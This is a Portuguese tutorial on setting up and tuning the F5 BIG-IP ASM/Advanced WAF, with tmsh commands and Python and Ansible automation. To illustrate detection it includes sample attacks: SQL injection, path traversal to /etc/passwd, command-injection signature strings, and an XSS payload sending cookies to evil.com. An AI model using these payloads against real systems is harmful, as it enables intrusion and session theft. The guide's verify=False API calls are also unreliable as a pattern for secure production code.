# Guia Completo: WAF no F5 BIG-IP ASM/AWAF

## Índice

1. [O que é WAF?](#o-que-é-waf)
2. [F5 ASM vs F5 Advanced WAF (AWAF)](#f5-asm-vs-f5-advanced-waf-awaf)
3. [Arquitetura e Posicionamento](#arquitetura-e-posicionamento)
4. [Configuração Inicial — Passo a Passo](#configuração-inicial--passo-a-passo)
5. [Security Policies — Políticas de Segurança](#security-policies--políticas-de-segurança)
6. [Modos de Operação: Transparent vs Blocking](#modos-de-operação-transparent-vs-blocking)
7. [Entendendo as Violações e Assinaturas](#entendendo-as-violações-e-assinaturas)
8. [Proteção contra Ataques Comuns (Casos Reais)](#proteção-contra-ataques-comuns-casos-reais)
9. [Tuning e Falsos Positivos](#tuning-e-falsos-positivos)
10. [Logging e Monitoramento do WAF](#logging-e-monitoramento-do-waf)
11. [Automação do WAF com Python e Ansible](#automação-do-waf-com-python-e-ansible)
12. [Boas Práticas e Checklist de Produção](#boas-práticas-e-checklist-de-produção)
13. [Troubleshooting WAF](#troubleshooting-waf)

---

## O que é WAF?

**Web Application Firewall (WAF)** é uma camada de segurança que protege aplicações web contra ataques na camada 7 (HTTP/HTTPS). Diferente de um firewall de rede tradicional (camada 3/4), o WAF inspeciona o conteúdo das requisições HTTP, analisando:

- **Headers HTTP** (User-Agent, Referer, Content-Type, etc.)
- **Corpo da requisição** (POST data, JSON, XML)
- **URL e parâmetros** (query strings, path traversal)
- **Cookies** (session hijacking, tampering)
- **Respostas do servidor** (data leakage, error messages)

### Analogia Simples

```
Firewall de Rede (L3/L4):    WAF (L7):
"Quem pode entrar?"          "O que a pessoa está fazendo dentro?"

Verifica:                     Verifica:
- IP de origem/destino        - Conteúdo da requisição HTTP
- Porta                       - SQL Injection no formulário
- Protocolo (TCP/UDP)         - XSS no campo de busca
                              - Tentativa de acessar /etc/passwd
```

### Por que usar WAF?

| Sem WAF | Com WAF |
|---------|---------|
| Aplicação exposta a SQL Injection | Requisições maliciosas bloqueadas antes de chegar à aplicação |
| XSS pode roubar sessões de usuários | Scripts maliciosos são filtrados |
| Bots podem fazer scraping sem controle | Rate limiting e bot detection |
| Dados sensíveis podem vazar nas respostas | Data guard mascara dados como CPF, cartão de crédito |
| Zero visibilidade de ataques | Dashboard completo de eventos de segurança |

---

## F5 ASM vs F5 Advanced WAF (AWAF)

| Recurso | ASM (Application Security Manager) | AWAF (Advanced WAF) |
|---------|-------------------------------------|---------------------|
| Proteção OWASP Top 10 | Sim | Sim |
| Assinaturas de ataque | Sim | Sim (mais atualizadas) |
| Bot Detection | Básico | Avançado (Proactive Bot Defense) |
| Proteção de API (REST/GraphQL) | Básico | Completo |
| Behavioral DoS (Layer 7) | Não | Sim |
| Credential Stuffing Protection | Não | Sim |
| DataSafe (criptografia de dados no browser) | Não | Sim |
| Machine Learning | Não | Sim |
| Threat Campaigns | Não | Sim |
| Custo | Incluído no BIG-IP | Licença adicional |

> **Nota:** O ASM foi o nome original. Em versões recentes, a F5 renomeou para Advanced WAF com funcionalidades extras. Em muitos ambientes, ainda se usa o termo ASM.

---

## Arquitetura e Posicionamento

### Onde o WAF fica na arquitetura?

```
                    ┌─────────────────────────────────────────┐
                    │              F5 BIG-IP                   │
                    │                                          │
Usuário ───────────▶│  [Virtual Server] ──▶ [WAF/ASM Policy]  │
(Internet)          │         │                    │           │
                    │         ▼                    ▼           │
                    │  [SSL Offloading]    [Inspeciona HTTP]   │
                    │         │                    │           │
                    │         ▼                    ▼           │
                    │     [Pool de Servidores Backend]         │
                    │     ┌──────┐ ┌──────┐ ┌──────┐          │
                    │     │Web 1 │ │Web 2 │ │Web 3 │          │
                    │     └──────┘ └──────┘ └──────┘          │
                    └─────────────────────────────────────────┘
```

### Fluxo de uma requisição com WAF

```
1. Cliente envia requisição HTTPS
       │
2. F5 termina SSL (SSL Offloading)
       │
3. F5 decodifica a requisição HTTP
       │
4. WAF/ASM inspeciona a requisição:
   ├── Verifica assinaturas de ataque
   ├── Valida parâmetros (tipo, tamanho, caracteres)
   ├── Verifica violações de protocolo HTTP
   ├── Aplica regras customizadas
   └── Verifica rate limiting
       │
5. Decisão:
   ├── ALLOW → Encaminha ao backend
   ├── BLOCK → Retorna página de erro (support ID)
   └── LOG  → Permite mas registra (modo transparent)
       │
6. Resposta do backend passa pelo WAF:
   ├── Data Guard: mascara dados sensíveis (CPF, cartão)
   ├── Remove headers internos (Server, X-Powered-By)
   └── Envia resposta ao cliente
```

---

## Configuração Inicial — Passo a Passo

### Pré-requisitos

- F5 BIG-IP com licença ASM ou AWAF ativa
- Virtual Server já configurado com pool funcionando
- Perfil HTTP associado ao Virtual Server
- Acesso admin à GUI ou API REST

### Passo 1: Verificar Licença

```bash
# Via tmsh
tmsh show sys license | grep -i "asm\|waf\|application security"

# Deve mostrar algo como:
# Application Security Manager (ASM)  : enabled
# ou
# Advanced Web Application Firewall   : enabled
```

### Passo 2: Provisionar o Módulo ASM

```bash
# Via tmsh
tmsh modify sys provision asm level nominal

# Aguardar o sistema reiniciar o serviço (pode levar alguns minutos)
tmsh show sys provision | grep asm
```

**Via GUI:**
1. Acesse `System > Resource Provisioning`
2. Defina **Application Security (ASM)** como **Nominal**
3. Clique em **Submit** e aguarde

### Passo 3: Criar Security Policy

**Via GUI (Recomendado para iniciantes):**

1. Acesse `Security > Application Security > Security Policies`
2. Clique em **Create**
3. Preencha:

```
Policy Name:          policy_app_ecommerce
Policy Template:      Rapid Deployment Policy  (recomendado para começar)
                      OU
                      Comprehensive           (mais restritivo, mais falsos positivos)

Virtual Server:       vs_app_producao         (associar ao VS existente)
Application Language: utf-8                    (suporta português)

Learning Mode:        Automatic               (o WAF aprende o tráfego legítimo)
Enforcement Mode:     Transparent              (SEMPRE comece em transparent!)
Signature Staging:    Enabled                  (assinaturas ficam em staging antes de bloquear)
```

4. Clique em **Create Policy**

**Via API REST (Python):**

```python
def criar_policy_waf(f5_host, token, policy_name, vs_name):
    """Cria uma security policy no ASM/AWAF."""
    url = f"https://{f5_host}/mgmt/tm/asm/policies"
    headers = {
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': token
    }
    payload = {
        "name": policy_name,
        "description": "Policy criada via automação",
        "templateName": "POLICY_TEMPLATE_RAPID_DEPLOYMENT",
        "enforcementMode": "transparent",
        "applicationLanguage": "utf-8",
        "caseInsensitive": True,
        "active": True
    }

    resp = requests.post(url, json=payload, headers=headers, verify=False)
    resp.raise_for_status()
    policy_id = resp.json()['id']
    print(f"[OK] Policy '{policy_name}' criada. ID: {policy_id}")

    # Associar ao Virtual Server
    url_vs = f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}/virtual-servers"
    payload_vs = {"virtualServerName": f"/Common/{vs_name}"}
    resp_vs = requests.post(url_vs, json=payload_vs, headers=headers, verify=False)
    resp_vs.raise_for_status()
    print(f"[OK] Policy associada ao VS '{vs_name}'.")

    # Aplicar policy
    url_apply = f"https://{f5_host}/mgmt/tm/asm/tasks/apply-policy"
    payload_apply = {"policyReference": {"link": f"https://localhost/mgmt/tm/asm/policies/{policy_id}"}}
    requests.post(url_apply, json=payload_apply, headers=headers, verify=False)
    print("[OK] Policy aplicada com sucesso.")

    return policy_id
```

### Passo 4: Configurar Logging Profile

**O logging é ESSENCIAL para visibilidade e tuning do WAF.**

```bash
# Via tmsh - Criar logging profile
tmsh create security log profile log_waf_app {
    application add {
        log_waf_app {
            local-storage enabled
            remote-storage splunk
            servers add {
                10.10.5.100:514 { }
            }
            filter {
                request-type {
                    values add { illegal }
                }
            }
            response-logging illegal
        }
    }
}

# Associar ao Virtual Server
tmsh modify ltm virtual vs_app_producao security-log-profiles add { log_waf_app }
```

**Via GUI:**
1. `Security > Event Logs > Logging Profiles > Create`
2. Marque **Application Security**
3. Configure:
   - Storage Destination: **Local** e/ou **Remote** (Splunk/Syslog)
   - Request Type: **Illegal requests only** (produção) ou **All requests** (tuning)
   - Response Logging: **For Illegal Requests**

### Passo 5: Verificar que Está Funcionando

```bash
# Testar com uma requisição maliciosa (SQL Injection)
curl -k "https://200.200.200.10/login?user=admin'%20OR%201=1--"

# Em modo Transparent: a requisição passa mas é logada
# Em modo Blocking: retorna página de bloqueio com Support ID

# Verificar logs
# Via GUI: Security > Event Logs > Application > Requests
# Via tmsh:
tmsh show security log profile log_waf_app
```

---

## Security Policies — Políticas de Segurança

### Tipos de Policy Templates

| Template | Descrição | Quando usar |
|----------|-----------|-------------|
| **Rapid Deployment** | Política baseada em assinaturas, menos restritiva | Implementação rápida, menor risco de falsos positivos |
| **Comprehensive** | Política completa com validação de parâmetros e entidades | Maior segurança, requer mais tuning |
| **Fundamental** | Proteção básica, OWASP Top 10 | Proteção mínima rápida |
| **Passive Deployment** | Somente logging, nunca bloqueia | Fase de aprendizado inicial |
| **API Security** | Otimizada para APIs REST/GraphQL | Microsserviços e APIs |

### Elementos de uma Security Policy

```
Security Policy
├── Allowed URLs
│   ├── /login
│   ├── /api/*
│   └── /checkout/*
│
├── Allowed File Types
│   ├── .html, .css, .js, .png, .jpg
│   └── (bloqueia: .exe, .bat, .sh, .sql)
│
├── Parameters
│   ├── username (type: alpha-numeric, max-length: 50)
│   ├── email (type: email, max-length: 100)
│   └── quantidade (type: integer, min: 1, max: 9999)
│
├── Attack Signatures
│   ├── SQL Injection (200+ assinaturas)
│   ├── Cross-Site Scripting (150+ assinaturas)
│   ├── Command Injection (100+ assinaturas)
│   └── ... (6000+ assinaturas no total)
│
├── Violations
│   ├── HTTP Protocol Compliance
│   ├── Evasion Techniques Detected
│   ├── Illegal parameter / URL / file type
│   └── Attack Signature Detected
│
├── Bot Defense
│   ├── Known Good Bots (Googlebot, etc.)
│   ├── Known Bad Bots (scrapers, etc.)
│   └── Unknown Bots (CAPTCHA challenge)
│
└── Data Guard
    ├── Mascarar CPF: ***.***.***-**
    ├── Mascarar Cartão: ****-****-****-1234
    └── Remover headers internos
```

---

## Modos de Operação: Transparent vs Blocking

### Modo Transparent (Monitoramento)

```
Requisição maliciosa → WAF detecta → REGISTRA no log → PERMITE passar → Backend recebe
```

**Quando usar:**
- Implementação inicial da policy (SEMPRE comece aqui)
- Fase de aprendizado e tuning
- Quando você quer entender o tráfego antes de bloquear
- Mínimo 2-4 semanas em transparent antes de mudar para blocking

**Configurar via tmsh:**
```bash
tmsh modify asm policy /Common/policy_app_ecommerce enforcement-mode transparent
tmsh modify asm policy /Common/policy_app_ecommerce apply
```

### Modo Blocking (Proteção Ativa)

```
Requisição maliciosa → WAF detecta → BLOQUEIA → Retorna página de erro → Backend NÃO recebe
```

**Quando usar:**
- Após período de tuning em transparent (2-4 semanas mínimo)
- Quando falsos positivos foram tratados
- Quando a equipe está confortável com o comportamento da policy

**Configurar via tmsh:**
```bash
tmsh modify asm policy /Common/policy_app_ecommerce enforcement-mode blocking
tmsh modify asm policy /Common/policy_app_ecommerce apply
```

### Página de Bloqueio Customizada

Quando o WAF bloqueia uma requisição, o usuário vê uma página de erro. Essa página pode ser customizada:

```html
<!-- Exemplo de página de bloqueio customizada -->
<html>
<head>
    <title>Acesso Bloqueado</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
        .container { background: white; padding: 40px; border-radius: 8px;
                     max-width: 600px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #d32f2f; }
        .support-id { background: #f5f5f5; padding: 10px; border-radius: 4px;
                      font-family: monospace; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Requisição Bloqueada</h1>
        <p>Sua requisição foi identificada como potencialmente maliciosa e foi bloqueada
           pelo nosso sistema de segurança.</p>
        <p>Se você acredita que isso é um erro, entre em contato com o suporte
           informando o ID abaixo:</p>
        <p class="support-id">Support ID: <%TS.request.ID()%></p>
        <p><small>Referência: <%TS.request.URI()%></small></p>
    </div>
</body>
</html>
```

**Configurar a página customizada:**

```bash
# Via tmsh
tmsh modify asm policy /Common/policy_app_ecommerce blocking-settings response-pages \
    custom-response-body "conteudo_html_aqui"
```

---

## Entendendo as Violações e Assinaturas

### Violações Mais Comuns

| Violação | Descrição | Severity |
|----------|-----------|----------|
| **Attack signature detected** | Uma assinatura de ataque conhecida foi identificada | Varia |
| **Illegal URL** | URL não está na lista de URLs permitidas | Warning |
| **Illegal parameter** | Parâmetro não reconhecido pela policy | Warning |
| **Illegal file type** | Extensão de arquivo não permitida | Error |
| **HTTP protocol compliance failed** | Requisição viola RFC do HTTP | Error |
| **Evasion technique detected** | Tentativa de bypass do WAF (encoding) | Critical |
| **Mandatory HTTP header is missing** | Header obrigatório não presente | Warning |
| **Parameter value does not comply** | Valor do parâmetro viola a regra (tipo, tamanho) | Warning |
| **Modified domain cookie** | Cookie de sessão foi alterado/tampering | Critical |
| **Disallowed request content type** | Content-Type não permitido | Warning |

### Categorias de Assinaturas de Ataque

```
Attack Signatures (6000+)
├── SQL Injection
│   ├── SQL-INJ: UNION SELECT
│   ├── SQL-INJ: OR 1=1
│   ├── SQL-INJ: DROP TABLE
│   └── SQL-INJ: INFORMATION_SCHEMA
│
├── Cross-Site Scripting (XSS)
│   ├── XSS: <script>alert()</script>
│   ├── XSS: onerror=
│   ├── XSS: javascript:
│   └── XSS: eval()
│
├── Command Injection
│   ├── CMD-INJ: ; cat /etc/passwd
│   ├── CMD-INJ: | ls -la
│   ├── CMD-INJ: && wget
│   └── CMD-INJ: $(whoami)
│
├── Path Traversal / LFI
│   ├── TRAV: ../../etc/passwd
│   ├── TRAV: ..%2f..%2f
│   └── TRAV: /proc/self/environ
│
├── Server-Side Request Forgery (SSRF)
│   ├── SSRF: http://169.254.169.254 (AWS metadata)
│   ├── SSRF: http://localhost
│   └── SSRF: file:///etc/passwd
│
├── XML/JSON Attacks
│   ├── XXE: <!ENTITY xxe SYSTEM>
│   ├── JSON: Injection attempts
│   └── JSON: Parser overflow
│
└── Bot Signatures
    ├── Known malicious bots
    ├── Vulnerability scanners (Nessus, Nikto)
    └── Credential stuffing tools
```

### Signature Staging

O **Staging** é um período em que novas assinaturas ficam em observação antes de serem efetivamente enforced:

```
Nova assinatura adicionada
        │
        ▼
[STAGING] (7 dias padrão)
    │
    ├── Monitora se há falsos positivos
    ├── Registra violações mas NÃO bloqueia
    └── Após período, revisão manual ou automática
        │
        ▼
[ENFORCED] → Assinatura ativa, bloqueia requisições maliciosas
```

**Configurar staging period:**
```bash
# Definir período de staging para 14 dias
tmsh modify asm policy /Common/policy_app_ecommerce signature-staging-period 14
```

---

## Proteção contra Ataques Comuns (Casos Reais)

### Caso 1: SQL Injection no Formulário de Login

**O Ataque:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{
    "username": "admin' OR '1'='1' --",
    "password": "qualquercoisa"
}
```

**Como o WAF protege:**
```
1. Requisição chega ao WAF
2. WAF analisa o corpo da requisição (JSON)
3. Detecta assinatura: SQL-INJ "OR '1'='1'"
4. Violação: "Attack signature detected" (Signature ID: 200002147)
5. Ação: BLOCK (em modo blocking) ou LOG (em modo transparent)
6. Retorna página de bloqueio com Support ID
```

**Log gerado:**
```json
{
    "timestamp": "2024-11-15T14:32:18Z",
    "support_id": "14789632501",
    "source_ip": "187.45.23.100",
    "method": "POST",
    "uri": "/api/login",
    "violation": "Attack signature detected",
    "signature": "SQL-INJ: OR boolean-based blind",
    "signature_id": "200002147",
    "severity": "Critical",
    "action": "blocked",
    "parameter": "username",
    "parameter_value": "admin' OR '1'='1' --"
}
```

### Caso 2: Cross-Site Scripting (XSS) Refletido

**O Ataque:**
```
GET /busca?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

**Como o WAF protege:**

O WAF detecta tags HTML e JavaScript no parâmetro `q`, identifica múltiplas assinaturas de XSS e bloqueia a requisição.

**Configuração específica para XSS:**
```bash
# Garantir que assinaturas de XSS estão habilitadas
tmsh list asm policy /Common/policy_app_ecommerce attack-signatures { filter-by-type "Cross-site scripting" }
```

### Caso 3: Ataque de Path Traversal / LFI

**O Ataque:**
```
GET /download?file=../../../../etc/passwd HTTP/1.1
```

**Como o WAF protege:**

```
1. WAF detecta sequência "../" no parâmetro
2. Violação: "Directory traversal" + "Attack signature detected"
3. Múltiplas assinaturas acionadas:
   - TRAV: ../../etc/passwd
   - TRAV: Multiple directory traversal attempts
4. Ação: BLOCK
```

### Caso 4: Proteção de API REST

**Cenário:** API de pagamento que aceita JSON.

**Configuração da policy para API:**

```python
def configurar_policy_api(f5_host, token, policy_id):
    """Configura policy otimizada para proteção de API REST."""
    headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': token}

    # 1. Configurar content profiles para JSON
    url = f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}/content-profiles"
    payload = {
        "name": "api_json_profile",
        "contentType": "json",
        "headerName": "Content-Type",
        "headerValue": "application/json"
    }
    requests.post(url, json=payload, headers=headers, verify=False)

    # 2. Definir URLs permitidas para a API
    url_urls = f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}/urls"
    api_endpoints = [
        {"name": "/api/v1/pagamento", "method": "POST", "protocol": "https"},
        {"name": "/api/v1/consulta", "method": "GET", "protocol": "https"},
        {"name": "/api/v1/estorno", "method": "POST", "protocol": "https"},
    ]
    for endpoint in api_endpoints:
        requests.post(url_urls, json=endpoint, headers=headers, verify=False)

    # 3. Definir parâmetros esperados com validação
    url_params = f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}/parameters"
    parametros = [
        {
            "name": "valor",
            "type": "explicit",
            "dataType": "decimal",
            "minimumLength": 1,
            "maximumLength": 10
        },
        {
            "name": "cartao_token",
            "type": "explicit",
            "dataType": "alpha-numeric",
            "minimumLength": 32,
            "maximumLength": 64
        },
        {
            "name": "pedido_id",
            "type": "explicit",
            "dataType": "integer",
            "minimumLength": 1,
            "maximumLength": 20
        }
    ]
    for param in parametros:
        requests.post(url_params, json=param, headers=headers, verify=False)

    print("[OK] Policy configurada para proteção de API REST.")
```

### Caso 5: Bot Defense — Proteção contra Scraping

**Cenário:** Concorrente usando bot para extrair preços do e-commerce.

**Configuração de Bot Defense:**

```
Via GUI: Security > Application Security > Bot Defense > Bot Defense Profile

Configuração:
├── Microservice Protection: Enabled
├── Browser Verification: Challenge with CAPTCHA
├── Known Bots:
│   ├── Googlebot: Allow (verificar IP Google)
│   ├── Bingbot: Allow
│   └── curl/wget: Block
├── Unknown Bots:
│   ├── Rate Limiting: 100 requests/minuto
│   └── CAPTCHA Challenge: Enabled
└── Bot Signatures:
    ├── Selenium: Block
    ├── PhantomJS: Block
    └── Puppeteer: Block
```

### Caso 6: Data Guard — Prevenção de Vazamento de Dados

**Cenário:** Aplicação retorna dados sensíveis nas respostas HTTP por erro do desenvolvedor.

**Configuração do Data Guard:**

```bash
# Via tmsh - Habilitar Data Guard
tmsh modify asm policy /Common/policy_app_ecommerce data-guard enabled
tmsh modify asm policy /Common/policy_app_ecommerce data-guard \
    credit-card-numbers enabled \
    us-social-security-numbers enabled \
    custom-patterns add { cpf { pattern "\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}" enabled true } }
```

**Resultado:**

```
# Resposta SEM Data Guard:
{ "cliente": "João Silva", "cpf": "123.456.789-00", "cartao": "4111111111111111" }

# Resposta COM Data Guard:
{ "cliente": "João Silva", "cpf": "***.***.***-**", "cartao": "****-****-****-1111" }
```

---

## Tuning e Falsos Positivos

### O que são Falsos Positivos?

**Falso Positivo:** O WAF bloqueia uma requisição legítima pensando que é um ataque.

**Exemplo:** Um usuário que coloca no campo de busca: `SELECT top 10 produtos`
O WAF pode interpretar como SQL Injection por causa da palavra `SELECT`.

### Processo de Tuning (Metodologia)

```
Semana 1-2: TRANSPARENT MODE
    │
    ├── Coletar logs de todas as violações
    ├── Identificar padrões de falso positivo
    └── NÃO bloquear nada ainda
    │
Semana 3-4: ANALISAR E AJUSTAR
    │
    ├── Revisar Learning Suggestions do ASM
    ├── Desabilitar assinaturas que geram falso positivo
    ├── Criar exceções (whitelist) para URLs/parâmetros específicos
    └── Ajustar parâmetros (tamanho, tipo de dado)
    │
Semana 5: ATIVAR BLOCKING GRADUAL
    │
    ├── Mover violações de alta confiança para blocking
    ├── Manter violações duvidosas em staging
    └── Monitorar de perto
    │
Semana 6+: BLOCKING TOTAL
    │
    ├── Todas as violações em modo blocking
    ├── Monitoramento contínuo
    └── Ajustes conforme necessário
```

### Como Tratar Falsos Positivos

#### 1. Desabilitar Assinatura Específica para um Parâmetro

```bash
# Cenário: Assinatura SQL-INJ dispara no campo "descricao" que aceita texto livre
tmsh modify asm policy /Common/policy_app_ecommerce \
    parameters modify { descricao { signature-overrides add { 200002147 { enabled false } } } }
```

#### 2. Criar Exceção por URL

```python
def criar_excecao_url(f5_host, token, policy_id, url_path, signature_ids):
    """Cria exceção de assinatura para uma URL específica."""
    headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': token}

    # Primeiro, obter a URL na policy
    url_api = f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}/urls"
    resp = requests.get(url_api, headers=headers, verify=False)
    urls = resp.json().get('items', [])

    url_id = None
    for u in urls:
        if u['name'] == url_path:
            url_id = u['id']
            break

    if not url_id:
        # Criar a URL primeiro
        payload = {"name": url_path, "protocol": "https", "type": "explicit"}
        resp = requests.post(url_api, json=payload, headers=headers, verify=False)
        url_id = resp.json()['id']

    # Desabilitar assinaturas específicas para esta URL
    for sig_id in signature_ids:
        url_sig = (f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}"
                   f"/urls/{url_id}/signature-overrides")
        payload = {"signatureId": sig_id, "enabled": False}
        requests.post(url_sig, json=payload, headers=headers, verify=False)

    print(f"[OK] Exceções criadas para URL '{url_path}'")
```

#### 3. Aceitar Learning Suggestions

```
Via GUI: Security > Application Security > Policy Building > Traffic Learning

O ASM analisa o tráfego e sugere:
├── "Accept" - Aceitar a sugestão (whitelist)
├── "Delete" - Ignorar a sugestão
└── "Accept All" - Aceitar todas (CUIDADO! Revise antes)
```

### Script de Análise de Falsos Positivos

```python
def analisar_falsos_positivos(f5_host, token, policy_id, ultimas_horas=24):
    """Analisa violações recentes para identificar possíveis falsos positivos."""
    headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': token}

    # Buscar eventos de segurança
    url = f"https://{f5_host}/mgmt/tm/asm/events/requests"
    params = {
        "$filter": f"policyReference/id eq '{policy_id}'",
        "$top": 1000,
        "$orderby": "requestDatetime desc"
    }
    resp = requests.get(url, headers=headers, params=params, verify=False)
    eventos = resp.json().get('items', [])

    # Agrupar por violação e contar
    contagem = {}
    for evento in eventos:
        for violacao in evento.get('violations', []):
            nome = violacao.get('name', 'unknown')
            if nome not in contagem:
                contagem[nome] = {
                    'total': 0,
                    'ips_unicos': set(),
                    'urls': set(),
                    'parametros': set()
                }
            contagem[nome]['total'] += 1
            contagem[nome]['ips_unicos'].add(evento.get('sourceIp', ''))
            contagem[nome]['urls'].add(evento.get('uri', ''))

    # Identificar prováveis falsos positivos
    print(f"\n{'='*80}")
    print(f"ANÁLISE DE FALSOS POSITIVOS - Últimas {ultimas_horas}h")
    print(f"{'='*80}\n")

    for violacao, dados in sorted(contagem.items(), key=lambda x: x[1]['total'], reverse=True):
        ips = len(dados['ips_unicos'])
        total = dados['total']

        # Heurística: muitos IPs diferentes = provavelmente falso positivo
        # Poucos IPs + muitas ocorrências = provavelmente ataque real
        provavel_fp = ips > 10 and total > 50

        indicador = "[PROVAVEL FP]" if provavel_fp else "[VERIFICAR]"
        print(f"{indicador} {violacao}")
        print(f"  Ocorrências: {total} | IPs únicos: {ips}")
        print(f"  URLs afetadas: {', '.join(list(dados['urls'])[:5])}")
        if provavel_fp:
            print(f"  RECOMENDAÇÃO: Muitos IPs diferentes. Provável falso positivo.")
            print(f"  AÇÃO: Considere criar exceção ou desabilitar assinatura para as URLs afetadas.")
        print()

    return contagem
```

---

## Logging e Monitoramento do WAF

### Configurar Envio de Logs para SIEM (Splunk/ELK)

```bash
# Formato de log para Splunk via Syslog
tmsh create security log profile log_waf_splunk {
    application add {
        log_waf_splunk {
            remote-storage splunk
            servers add {
                10.10.5.100:514 { }
            }
            filter {
                request-type {
                    values add { all }
                }
            }
            format {
                field-delimiter ","
                fields {
                    ip_client { }
                    attack_type { }
                    blocking_exception_reason { }
                    date_time { }
                    dest_ip { }
                    dest_port { }
                    geo_location { }
                    method { }
                    policy_name { }
                    protocol { }
                    request_status { }
                    severity { }
                    sig_ids { }
                    sig_names { }
                    src_port { }
                    sub_violations { }
                    support_id { }
                    uri { }
                    violations { }
                    x_forwarded_for_header_value { }
                }
            }
        }
    }
}
```

### Dashboard de Monitoramento com Python

```python
def gerar_relatorio_waf(f5_host, token, policy_id):
    """Gera relatório resumido do WAF."""
    headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': token}

    # Buscar estatísticas da policy
    url = f"https://{f5_host}/mgmt/tm/asm/policies/{policy_id}/policy-statistics"
    resp = requests.get(url, headers=headers, verify=False)

    print("\n" + "=" * 60)
    print("RELATÓRIO WAF - RESUMO EXECUTIVO")
    print("=" * 60)

    if resp.status_code == 200:
        stats = resp.json()
        print(f"\nRequisições totais inspecionadas: {stats.get('totalRequests', 'N/A')}")
        print(f"Requisições bloqueadas: {stats.get('blockedRequests', 'N/A')}")
        print(f"Violações detectadas: {stats.get('totalViolations', 'N/A')}")
        print(f"Assinaturas acionadas: {stats.get('signatureViolations', 'N/A')}")

    # Top ataques
    url_events = f"https://{f5_host}/mgmt/tm/asm/events/requests"
    params = {"$top": 500, "$orderby": "requestDatetime desc"}
    resp_events = requests.get(url_events, headers=headers, params=params, verify=False)

    if resp_events.status_code == 200:
        eventos = resp_events.json().get('items', [])

        # Top IPs atacantes
        ips = {}
        ataques = {}
        for ev in eventos:
            ip = ev.get('sourceIp', 'unknown')
            ips[ip] = ips.get(ip, 0) + 1
            for v in ev.get('violations', []):
                nome = v.get('name', 'unknown')
                ataques[nome] = ataques.get(nome, 0) + 1

        print("\n--- Top 10 IPs Atacantes ---")
        for ip, count in sorted(ips.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  {ip}: {count} violações")

        print("\n--- Top 10 Tipos de Ataque ---")
        for ataque, count in sorted(ataques.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  {ataque}: {count}")

    print("\n" + "=" * 60)
```

---

## Automação do WAF com Python e Ansible

### Exportar e Importar Policies (Backup/Restore)

```python
def exportar_policy(f5_host, token, policy_name, arquivo_destino):
    """Exporta uma policy ASM para arquivo XML/JSON."""
    headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': token}

    # Iniciar task de exportação
    url = f"https://{f5_host}/mgmt/tm/asm/tasks/export-policy"

    # Primeiro obter o ID da policy
    url_policies = f"https://{f5_host}/mgmt/tm/asm/policies"
    resp = requests.get(url_policies, headers=headers, verify=False)
    policies = resp.json().get('items', [])

    policy_id = None
    for p in policies:
        if p['name'] == policy_name:
            policy_id = p['id']
            break

    if not policy_id:
        print(f"[ERRO] Policy '{policy_name}' não encontrada.")
        return None

    payload = {
        "filename": arquivo_destino,
        "policyReference": {
            "link": f"https://localhost/mgmt/tm/asm/policies/{policy_id}"
        }
    }
    resp = requests.post(url, json=payload, headers=headers, verify=False)
    resp.raise_for_status()
    task_id = resp.json()['id']

    # Aguardar conclusão
    while True:
        url_task = f"https://{f5_host}/mgmt/tm/asm/tasks/export-policy/{task_id}"
        resp_task = requests.get(url_task, headers=headers, verify=False)
        status = resp_task.json().get('status', '')
        if status == 'COMPLETED':
            print(f"[OK] Policy exportada para: {arquivo_destino}")
            return arquivo_destino
        elif status == 'FAILURE':
            print(f"[ERRO] Falha na exportação: {resp_task.json().get('result', {}).get('message', '')}")
            return None
        time.sleep(2)


def importar_policy(f5_host, token, arquivo_origem, policy_name):
    """Importa uma policy ASM de um arquivo."""
    headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': token}

    url = f"https://{f5_host}/mgmt/tm/asm/tasks/import-policy"
    payload = {
        "filename": arquivo_origem,
        "name": policy_name
    }
    resp = requests.post(url, json=payload, headers=headers, verify=False)
    resp.raise_for_status()
    task_id = resp.json()['id']

    while True:
        url_task = f"https://{f5_host}/mgmt/tm/asm/tasks/import-policy/{task_id}"
        resp_task = requests.get(url_task, headers=headers, verify=False)
        status = resp_task.json().get('status', '')
        if status == 'COMPLETED':
            print(f"[OK] Policy '{policy_name}' importada com sucesso.")
            return True
        elif status == 'FAILURE':
            print(f"[ERRO] Falha na importação.")
            return False
        time.sleep(2)
```

### Ansible: Gerenciar WAF Policy

```yaml
# playbook_waf_management.yml
---
- name: Gerenciar WAF Policy no F5
  hosts: f5_devices
  connection: local
  gather_facts: false

  vars:
    provider:
      server: "192.168.1.245"
      user: "admin"
      password: "{{ vault_f5_password }}"
      validate_certs: false

  tasks:
    - name: Criar ASM Policy
      f5networks.f5_modules.bigip_asm_policy_manage:
        provider: "{{ provider }}"
        name: "policy_api_pagamento"
        active: true
        state: present

    - name: Importar ASM Policy de arquivo
      f5networks.f5_modules.bigip_asm_policy_import:
        provider: "{{ provider }}"
        name: "policy_api_pagamento"
        source: "/var/tmp/policy_backup.xml"
        state: present

    - name: Adicionar assinaturas de ataque
      f5networks.f5_modules.bigip_asm_policy_signature_set:
        provider: "{{ provider }}"
        policy_name: "policy_api_pagamento"
        name: "SQL Injection Signatures"
        alarm: true
        block: true
        learn: true
        state: present

    - name: Configurar Server Technology
      f5networks.f5_modules.bigip_asm_policy_server_technology:
        provider: "{{ provider }}"
        policy_name: "policy_api_pagamento"
        name: "Apache Tomcat"
        state: present

    - name: Aplicar policy
      f5networks.f5_modules.bigip_asm_policy_manage:
        provider: "{{ provider }}"
        name: "policy_api_pagamento"
        active: true
        state: present

